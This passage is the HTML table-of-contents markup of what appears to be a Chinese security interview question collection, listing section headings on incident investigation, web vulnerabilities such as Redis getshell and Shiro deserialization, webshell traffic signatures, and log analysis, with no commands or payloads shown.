class="toc-number">2.37.3.</span> <span class="toc-text">系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5-2"><span class="toc-number">2.37.3.1.</span> <span class="toc-text">Windows系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%BF%A1%E6%81%AF%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.1.1.</span> <span class="toc-text">用户信息排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E3%80%81%E6%9C%8D%E5%8A%A1%E3%80%81%E9%A9%B1%E5%8A%A8%E3%80%81%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.1.2.</span> <span class="toc-text">进程、服务、驱动、启动项排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.1.3.</span> <span class="toc-text">网络连接排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.1.4.</span> <span class="toc-text">任务计划排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.1.5.</span> <span class="toc-text">文件排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#linux%E7%B3%BB%E7%BB%9F%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.2.</span> <span class="toc-text">linux系统排查</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%B4%A6%E6%88%B7%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.2.1.</span> <span class="toc-text">账户排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">2.37.3.2.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">2.37.3.3.</span> <span class="toc-text">历史命令</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%80%9A%E8%BF%87-bash-history%E6%9F%A5%E7%9C%8B%E5%B8%90%E5%8F%B7%E6%89%A7%E8%A1%8C%E8%BF%87%E7%9A%84%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">2.37.3.3.1.</span> <span class="toc-text">通过.bash_history查看帐号执行过的系统命令</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.37.3.4.</span> <span class="toc-text">检查异常端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.37.3.5.</span> <span class="toc-text">检查异常进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">2.37.3.6.</span> <span class="toc-text">检查开机启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">2.37.3.7.</span> <span class="toc-text">检查定时任务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-number">2.37.3.7.1.</span> <span class="toc-text">基本命令</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-2"><span class="toc-number">2.37.3.7.2.</span> <span class="toc-text">入侵排查</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.37.3.8.</span> <span class="toc-text">检查服务</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5-3"><span class="toc-number">2.37.3.8.1.</span> <span class="toc-text">入侵排查</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="toc-number">2.37.3.8.2.</span> <span class="toc-text">服务器自启动</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6"><span class="toc-number">2.37.3.9.</span> <span class="toc-text">检查异常文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">2.37.3.10.</span> <span class="toc-text">检查系统日志</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6-%E6%89%BE-php%E5%90%8E%E7%BC%80%E6%96%87%E4%BB%B6"><span class="toc-number">2.37.3.11.</span> <span class="toc-text">检查异常文件,找.php后缀文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-2"><span class="toc-number">2.37.3.12.</span> <span class="toc-text">检查系统日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#35-OSI-%E7%9A%84%E4%B8%83%E5%B1%82%E6%A8%A1%E5%9E%8B%E9%83%BD%E6%9C%89%E5%93%AA%E4%BA%9B%EF%BC%9F"><span class="toc-number">2.38.</span> <span class="toc-text">35.OSI 的七层模型都有哪些？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#36-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%EF%BC%8C%E6%88%91%E4%BB%AC%E9%80%9A%E5%B8%B8%E8%8E%B7%E5%8F%96%E4%BB%80%E4%B9%88%E6%96%87%E4%BB%B6"><span class="toc-number">2.39.</span> <span class="toc-text">36.任意文件读取，我们通常获取什么文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#37-ssrf%E4%BD%BF%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.40.</span> <span class="toc-text">37.ssrf使用了什么协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#38-PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%BD%BF%E7%94%A8%E4%BA%86%E4%BB%80%E4%B9%88%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.41.</span> <span class="toc-text">38.PHP文件包含使用了什么协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#php-filter%EF%BC%88%E6%9C%AC%E5%9C%B0%E7%A3%81%E7%9B%98%E6%96%87%E4%BB%B6%E8%BF%9B%E8%A1%8C%E8%AF%BB%E5%8F%96%EF%BC%89"><span class="toc-number">2.41.1.</span> <span class="toc-text">php:&#x2F;&#x2F;filter（本地磁盘文件进行读取）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#php-input%E8%AE%BF%E9%97%AE%E8%AF%B7%E6%B1%82%E7%9A%84%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E7%9A%84%E5%8F%AA%E8%AF%BB%E6%B5%81-%E7%9B%B4%E6%8E%A5%E8%AF%BB%E5%8F%96%E5%88%B0POST%E4%B8%8A%E6%B2%A1%E6%9C%89%E7%BB%8F%E8%BF%87%E8%A7%A3%E6%9E%90%E7%9A%84%E5%8E%9F%E5%A7%8B%E6%95%B0%E6%8D%AE%E3%80%82"><span class="toc-number">2.41.2.</span> <span class="toc-text">php:&#x2F;&#x2F;input	访问请求的原始数据的只读流,直接读取到POST上没有经过解析的原始数据。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#file-%E9%80%9A%E8%BF%87file%E4%BC%AA%E5%8D%8F%E8%AE%AE%E5%8F%AF%E4%BB%A5%E8%AE%BF%E9%97%AE%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%EF%BC%8C%E8%AF%BB%E5%8F%96%E5%88%B0%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9"><span class="toc-number">2.41.3.</span> <span class="toc-text">file:&#x2F;&#x2F;	通过file伪协议可以访问本地文件系统，读取到文件的内容</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#data"><span class="toc-number">2.41.4.</span> <span class="toc-text">data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#phar-php%E8%A7%A3%E5%8E%8B%E7%BC%A9%E7%9A%84%E4%B8%80%E4%B8%AA%E5%87%BD%E6%95%B0%EF%BC%8C%E4%B8%8D%E7%AE%A1%E5%90%8E%E7%BC%80%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%8C%E9%83%BD%E4%BC%9A%E5%BD%93%E5%81%9A%E5%8E%8B%E7%BC%A9%E5%8C%85%E6%9D%A5%E8%A7%A3%E5%8E%8B"><span class="toc-number">2.41.5.</span> <span class="toc-text">phar:&#x2F;&#x2F;	php解压缩的一个函数，不管后缀是什么，都会当做压缩包来解压</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#zlib-%E2%80%94-%E5%8E%8B%E7%BC%A9%E6%B5%81"><span class="toc-number">2.41.6.</span> <span class="toc-text">zlib:&#x2F;&#x2F; — 压缩流</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ftp-%E2%80%94-%E8%AE%BF%E9%97%AE-FTP-s-URLs"><span class="toc-number">2.41.7.</span> <span class="toc-text">ftp:&#x2F;&#x2F; — 访问 FTP(s) URLs</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#39-%E5%90%84%E7%A7%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.42.</span> <span class="toc-text">39.各种数据库的区别,</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.42.1.</span> <span class="toc-text">数据库端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#40-Redis-getshell%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-number">2.43.</span> <span class="toc-text">40.Redis getshell的过程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E5%86%99shell%EF%BC%8C%E5%B0%86shell%E5%86%99%E5%9C%A8web%E7%9B%AE%E5%BD%95%E4%B8%8B"><span class="toc-number">2.43.1.</span> <span class="toc-text">绝对路径写shell，将shell写在web目录下</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#-2"><span class="toc-number">2.43.2.</span> <span class="toc-text"></span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E8%BF%9B%E8%A1%8C%E5%8F%8D%E5%BC%B9shell-centos"><span class="toc-number">2.43.3.</span> <span class="toc-text">利用定时任务进行反弹shell(centos)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis-%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6getshell"><span class="toc-number">2.43.4.</span> <span class="toc-text">redis 主从复制getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#redis%E6%9C%AA%E6%8E%88%E6%9D%83%E5%85%AC%E9%92%A5%E5%AF%BC%E5%85%A5"><span class="toc-number">2.43.5.</span> <span class="toc-text">redis未授权公钥导入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#41-sqlmap%E6%80%8E%E4%B9%88%E7%9C%8B%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.44.</span> <span class="toc-text">41.sqlmap怎么看当前用户权限</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#42-sqlmap-os-shell-%E5%90%8E%E5%8F%B0%E6%89%A7%E8%A1%8C%E4%BA%86%E4%BB%80%E4%B9%88%E6%93%8D%E4%BD%9C"><span class="toc-number">2.45.</span> <span class="toc-text">42.sqlmap --os-shell 后台执行了什么操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#43-nmap%E6%80%8E%E4%B9%88%E9%9A%90%E8%97%8Fip%E6%89%AB%E6%8F%8F"><span class="toc-number">2.46.</span> <span class="toc-text">43.nmap怎么隐藏ip扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#44-%E6%8C%96%E8%BF%87SRC%E5%90%97"><span class="toc-number">2.47.</span> <span class="toc-text">44.挖过SRC吗?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#45-%E7%94%A8%E8%BF%87%E5%93%AA%E4%BA%9B%E5%AE%89%E5%85%A8%E8%AE%BE%E5%A4%87"><span class="toc-number">2.48.</span> <span class="toc-text">45.用过哪些安全设备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#46-Webshell%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">2.49.</span> <span class="toc-text">46.Webshell管理工具的流量特征</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Cobalt-Strike%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81"><span class="toc-number">2.49.1.</span> <span class="toc-text">Cobalt Strike流量特征</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80"><span class="toc-number">2.49.2.</span> <span class="toc-text">菜刀</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%9A%81%E5%89%91"><span class="toc-number">2.49.3.</span> <span class="toc-text">蚁剑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E"><span class="toc-number">2.49.4.</span> <span class="toc-text">冰蝎</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E2-0"><span class="toc-number">2.49.4.1.</span> <span class="toc-text">冰蝎2.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E3-0"><span class="toc-number">2.49.4.2.</span> <span class="toc-text">冰蝎3.0</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%86%B0%E8%9D%8E4-0"><span class="toc-number">2.49.4.3.</span> <span class="toc-text">冰蝎4.0</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81Content-Type%E5%AD%97%E6%AE%B5"><span class="toc-number">2.49.4.3.1.</span> <span class="toc-text">流量特征Content-Type字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#User-agent-%E5%AD%97%E6%AE%B5"><span class="toc-number">2.49.4.3.2.</span> <span class="toc-text">User-agent 字段</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E9%95%BF%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.49.4.3.3.</span> <span class="toc-text">流量特征长连接</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E5%9B%BA%E5%AE%9A%E7%9A%84%E8%AF%B7%E6%B1%82%E5%A4%B4%E5%92%8C%E5%93%8D%E5%BA%94%E5%A4%B4"><span class="toc-number">2.49.4.3.4.</span> <span class="toc-text">流量特征固定的请求头和响应头</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.49.4.3.5.</span> <span class="toc-text">端口</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#HP-webshell-%E4%B8%AD%E5%AD%98%E5%9C%A8%E5%9B%BA%E5%AE%9A%E4%BB%A3%E7%A0%81"><span class="toc-number">2.49.4.3.6.</span> <span class="toc-text">HP webshell  中存在固定代码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81%E8%BF%9E%E6%8E%A5%E5%AF%86%E7%A0%81"><span class="toc-number">2.49.4.3.7.</span> <span class="toc-text">流量特征连接密码</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%93%A5%E6%96%AF%E6%8B%89"><span class="toc-number">2.49.4.4.</span> <span class="toc-text">哥斯拉</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ookie"><span class="toc-number">2.49.4.4.1.</span> <span class="toc-text">ookie</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%93%8D%E5%BA%94%E4%BD%93"><span class="toc-number">2.49.4.4.2.</span> <span class="toc-text">响应体</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E7%89%B9%E5%BE%81"><span class="toc-number">2.49.4.4.3.</span> <span class="toc-text">连接特征</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#47-shiro550%E5%92%8Cshiro721%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">2.50.</span> <span class="toc-text">47.shiro550和shiro721的区别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro550"><span class="toc-number">2.50.1.</span> <span class="toc-text">shiro550</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shiro721"><span class="toc-number">2.50.2.</span> <span class="toc-text">shiro721</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#48-java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%BA%86%E8%A7%A3%E5%90%97-%E8%AE%B2%E4%B8%80%E4%BA%9Bshiro550%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.51.</span> <span class="toc-text">48.java反序列化了解吗?讲一些shiro550漏洞</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">3.</span> <span class="toc-text">49.了解过鱼叉攻击和水坑攻击吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">50.报错注入有哪些函数?</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#floor-%E5%87%BD%E6%95%B0"><span class="toc-number">4.1.</span> <span class="toc-text">floor()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#updatexml%E6%8A%A5%E9%94%99"><span class="toc-number">4.2.</span> <span class="toc-text">updatexml报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#extravalue%E6%8A%A5%E9%94%99"><span class="toc-number">4.3.</span> <span class="toc-text">extravalue报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA%E6%8A%A5%E9%94%99"><span class="toc-number">4.4.</span> <span class="toc-text">整数溢出报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#exp%E6%8A%A5%E9%94%99"><span class="toc-number">4.5.</span> <span class="toc-text">exp报错</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pow%E6%8A%A5%E9%94%99"><span class="toc-number">4.6.</span> <span class="toc-text">pow报错</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">51.二次注入原理是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">6.</span> <span class="toc-text">52.堆叠注入原理是什么?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">7.</span> <span class="toc-text">53.讲一讲weblogic有哪些CVE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">8.</span> <span class="toc-text">54.Fastjson漏洞原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">9.</span> <span class="toc-text">55.如何判断shiro框架？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">10.</span> <span class="toc-text">56.你还知道哪些框架？框架哪些漏洞？如何修复？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#thinkphp"><span class="toc-number">10.1.</span> <span class="toc-text">thinkphp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Flask"><span class="toc-number">10.2.</span> <span class="toc-text">Flask</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">11.</span> <span class="toc-text">57.域接触多少？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">12.</span> <span class="toc-text">58.有没有搭过应急环境</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">13.</span> <span class="toc-text">59.XXE是不是TOP10？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">14.</span> <span class="toc-text">60.挖矿病毒判断&amp;挖矿常见手段&amp;处理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E9%99%A4%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E7%A8%8B%E5%BA%8F"><span class="toc-number">14.1.</span> <span class="toc-text">清除恶意挖矿程序</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%98%B2%E6%8A%A4%E6%81%B6%E6%84%8F%E6%8C%96%E7%9F%BF%E6%94%BB%E5%87%BB"><span class="toc-number">14.1.1.</span> <span class="toc-text">防护恶意挖矿攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BC%A0%E6%92%AD%E6%96%B9%E5%BC%8F"><span class="toc-number">14.2.</span> <span class="toc-text">传播方式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">15.</span> <span class="toc-text">61.常见端口漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E7%AB%AF%E5%8F%A3%EF%BC%88SSH%EF%BC%89"><span class="toc-number">15.0.1.</span> <span class="toc-text">22 端口（SSH）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1433-%E7%AB%AF%E5%8F%A3%EF%BC%88sql-server%EF%BC%89"><span class="toc-number">15.0.2.</span> <span class="toc-text">1433 端口（sql server）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-465%E7%AB%AF%E5%8F%A3%E6%B8%97%E9%80%8F%E5%89%96%E6%9E%90"><span class="toc-number">15.0.3.</span> <span class="toc-text">25&#x2F;465端口渗透剖析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#443-%E7%AB%AF%E5%8F%A3%EF%BC%88SSL%EF%BC%89"><span class="toc-number">15.0.4.</span> <span class="toc-text">443 端口（SSL）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">16.</span> <span class="toc-text">62.Linux日志分析技巧命令</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97-3"><span class="toc-number">16.0.0.1.</span> <span class="toc-text">检查系统日志</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">17.</span> <span class="toc-text">63.windows日志分析工具</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">18.</span> <span class="toc-text">64.给你一个比较大的日志，应该如何分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">19.</span> <span class="toc-text">65.流量检测设备和态势感知设备发生报警，对警告进行分析，讲一下你流量分析和上机排查的思路</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%80%E4%B8%8B%E6%98%AF%E5%90%A6%E6%98%AF%E8%AF%AF%E6%8A%A5-%E8%AE%BE%E5%A4%87%E8%AF%AF%E6%8A%A5%E5%A6%82%E4%BD%95%E5%A4%84%E7%90%86"><span class="toc-number">19.0.1.</span> <span class="toc-text">排查一下是否是误报,设备误报如何处理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8E%92%E6%9F%A5%E4%B8%BB%E6%9C%BA%E4%B8%8A%E9%9D%A2%E6%98%AF%E5%90%A6%E6%9C%89%E5%85%B6%E4%BB%96%E7%9A%84%E5%91%8A%E8%AD%A6%E6%83%85%E5%86%B5"><span class="toc-number">19.0.2.</span> <span class="toc-text">排查主机上面是否有其他的告警情况</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8A%E6%9C%BA%E6%8E%92%E6%9F%A5"><span class="toc-number">19.0.3.</span> <span class="toc-text">上机排查</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ip%E4%BB%A3%E7%90%86%E5%A6%82%E4%BD%95%E6%8E%92%E6%9F%A5"><span class="toc-number">19.1.</span> <span class="toc-text">ip代理如何排查</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">20.</span> <span class="toc-text">66.如何修改WEB端口？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">21.</span> <span class="toc-text">67.你还用过其他态势感知的产品吗？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">22.</span> <span class="toc-text">68.钓鱼邮件处置</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">23.</span> <span class="toc-text">69.如何查看区分是扫描流量和手动流量</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">24.</span> <span class="toc-text">70.WAF产品如何来拦截攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#WAF%E4%B8%BB%E8%A6%81%E6%98%AF%E9%80%9A%E8%BF%87%E5%86%85%E7%BD%AE%E7%9A%84%E5%BE%88%E5%A4%9A%E5%AE%89%E5%85%A8%E8%A7%84%E5%88%99%E6%9D%A5%E8%BF%9B%E8%A1%8C%E9%98%B2%E5%BE%A1"><span class="toc-number">24.0.1.</span> <span class="toc-text">WAF主要是通过内置的很多安全规则来进行防御.</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">25.</span> <span class="toc-text">71.不安全的第三方组件的漏洞如何做前置规避？</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">26.</span> <span class="toc-text">72.如果现在要你写一个检测命令注入的脚本？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#72-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">26.1.</span> <span class="toc-text">72.渗透测试流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BE%B9%E7%BC%98%E8%B5%84%E4%BA%A7%E5%A6%82%E4%BD%95%E6%8E%A2%E6%B5%8B"><span class="toc-number">26.1.1.</span> <span class="toc-text">边缘资产如何探测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86"><span class="toc-number">26.1.2.</span> <span class="toc-text">子域名收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E6%9F%A5%E8%AF%A2"><span class="toc-number">26.1.2.1.</span> <span class="toc-text">搜索引擎查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9C%A8%E7%BA%BF%E6%9F%A5%E8%AF%A2%E6%8E%A5%E5%8F%A3"><span class="toc-number">26.1.2.2.</span> <span class="toc-text">在线查询接口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%90%E5%9F%9F%E5%90%8D%E6%9A%B4%E5%8A%9B%E7%8C%9C%E8%A7%A3"><span class="toc-number">26.1.2.3.</span> <span class="toc-text">子域名暴力猜解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#DNS%E6%9F%A5%E8%AF%A2-%E6%9E%9A%E4%B8%BE"><span class="toc-number">26.1.2.4.</span> <span class="toc-text">DNS查询&#x2F;枚举</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HTTPS%E8%AF%81%E4%B9%A6"><span class="toc-number">26.1.2.5.</span> <span class="toc-text">HTTPS证书</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" 